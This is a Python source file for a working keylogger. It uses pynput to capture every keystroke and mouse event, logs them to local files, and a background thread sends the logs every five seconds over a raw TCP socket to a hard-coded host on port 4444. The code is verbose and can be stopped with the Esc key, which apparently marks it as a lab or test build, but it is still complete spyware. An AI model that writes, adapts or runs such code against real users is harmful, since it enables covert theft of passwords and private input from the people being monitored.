import pynput
from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from datetime import datetime
import socket
import threading
import time
import os
import subprocess

keys = []
mouse_events = []
SERVER_IP = "192.168.1.73"
SERVER_PORT = 4444
SEND_INTERVAL = 5

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def test_network_connectivity():
    timestamp = get_timestamp()
    print(f"[{timestamp}] Testing network connectivity to {SERVER_IP}")
    try:
        result = subprocess.run(["ping", "-c", "1", SERVER_IP], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"[{timestamp}] Ping successful: {SERVER_IP} is reachable")
            return True
        else:
            print(f"[{timestamp}] Ping failed: {SERVER_IP} is not reachable")
            print(f"[{timestamp}] Ping output: {result.stdout} {result.stderr}")
            return False
    except subprocess.TimeoutExpired:
        print(f"[{timestamp}] Ping timeout: {SERVER_IP} is not reachable")
        return False
    except Exception as e:
        print(f"[{timestamp}] Error testing network connectivity: {e}")
        return False

def on_press(key):
    timestamp = get_timestamp()
    keys.append((key, timestamp))
    write_key_file(keys)
    
    try:
        print(f"[{timestamp}] Alphanumeric key {key.char} pressed")
    except AttributeError:
        print(f"[{timestamp}] Special key {key} pressed")

def on_release(key):
    timestamp = get_timestamp()
    print(f"[{timestamp}] {key} released")
    if key == Key.esc:
        return False

def write_key_file(keys):
    try:
        with open("keylog.txt", "a") as f:
            for key, timestamp in keys:
                k = str(key).replace("'", "")
                if hasattr(key, 'char') and key.char:
                    f.write(f"[{timestamp}] {key.char} ")
                else:
                    f.write(f"[{timestamp}] [{k}] ")
        print(f"[{timestamp}] Updated keylog.txt with {len(keys)} entries")
    except Exception as e:
        print(f"[{timestamp}] Error writing to keylog.txt: {e}")
    finally:
        keys.clear()

def on_move(x, y):
    timestamp = get_timestamp()
    mouse_events.append((f"Move to ({x}, {y})", timestamp))
    write_mouse_file(mouse_events)

def on_click(x, y, button, pressed):
    timestamp = get_timestamp()
    action = "Pressed" if pressed else "Released"
    mouse_events.append((f"Click {button} {action} at ({x}, {y})", timestamp))
    write_mouse_file(mouse_events)
    print(f"[{timestamp}] Mouse {button} {action} at ({x}, {y})")

def on_scroll(x, y, dx, dy):
    timestamp = get_timestamp()
    mouse_events.append((f"Scroll ({dx}, {dy}) at ({x}, {y})", timestamp))
    write_mouse_file(mouse_events)
    print(f"[{timestamp}] Mouse Scroll ({dx}, {dy}) at ({x}, {y})")

def write_mouse_file(mouse_events):
    try:
        with open("mouselog.txt", "a") as f:
            for event, timestamp in mouse_events:
                f.write(f"[{timestamp}] {event} ")
        print(f"[{get_timestamp()}] Updated mouselog.txt with {len(mouse_events)} entries")
    except Exception as e:
        print(f"[{get_timestamp()}] Error writing to mouselog.txt: {e}")
    finally:
        mouse_events.clear()

def send_logs():
    while True:
        timestamp = get_timestamp()
        print(f"[{timestamp}] Starting log send cycle")
        
        if not test_network_connectivity():
            print(f"[{timestamp}] Skipping send due to network failure")
            time.sleep(SEND_INTERVAL)
            continue
        
        keylog_data = ""
        mouselog_data = ""
        
        if os.path.exists("keylog.txt"):
            try:
                with open("keylog.txt", "r") as f:
                    keylog_data = f.read()
                print(f"[{timestamp}] Read keylog.txt: {len(keylog_data)} bytes")
            except Exception as e:
                print(f"[{timestamp}] Error reading keylog.txt: {e}")
        else:
            print(f"[{timestamp}] keylog.txt does not exist")
        
        if os.path.exists("mouselog.txt"):
            try:
                with open("mouselog.txt", "r") as f:
                    mouselog_data = f.read()
                print(f"[{timestamp}] Read mouselog.txt: {len(mouselog_data)} bytes")
            except Exception as e:
                print(f"[{timestamp}] Error reading mouselog.txt: {e}")
        else:
            print(f"[{timestamp}] mouselog.txt does not exist")
        
        if not keylog_data and not mouselog_data:
            print(f"[{timestamp}] No data to send (both logs empty)")
            time.sleep(SEND_INTERVAL)
            continue
        
        try:
            print(f"[{timestamp}] Connecting to {SERVER_IP}:{SERVER_PORT}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((SERVER_IP, SERVER_PORT))
            print(f"[{timestamp}] Successfully connected to {SERVER_IP}:{SERVER_PORT}")
            
            if keylog_data:
                s.sendall(f"--- keylog.txt ---\n{keylog_data}\n".encode())
                print(f"[{timestamp}] Sent keylog.txt: {len(keylog_data)} bytes")
            
            if mouselog_data:
                s.sendall(f"--- mouselog.txt ---\n{mouselog_data}\n".encode())
                print(f"[{timestamp}] Sent mouselog.txt: {len(mouselog_data)} bytes")
            
            s.sendall(b"--- END ---\n")
            print(f"[{timestamp}] Sent end marker")
            
            s.close()
            print(f"[{timestamp}] Connection closed")
        
        except socket.timeout:
            print(f"[{timestamp}] Connection timeout to {SERVER_IP}:{SERVER_PORT}")
        
        except socket.error as e:
            print(f"[{timestamp}] Socket error: {e}")
        
        except Exception as e:
            print(f"[{timestamp}] Unexpected error in send_logs: {e}")
        
        time.sleep(SEND_INTERVAL)

def main():
    print(f"[{get_timestamp()}] Starting key/mouse logger")
    threading.Thread(target=send_logs, daemon=True).start()
    
    with KeyboardListener(on_press=on_press, on_release=on_release) as keyboard_listener, \
         MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as mouse_listener:
        keyboard_listener.join()
        mouse_listener.join()

if __name__ == "__main__":
    main()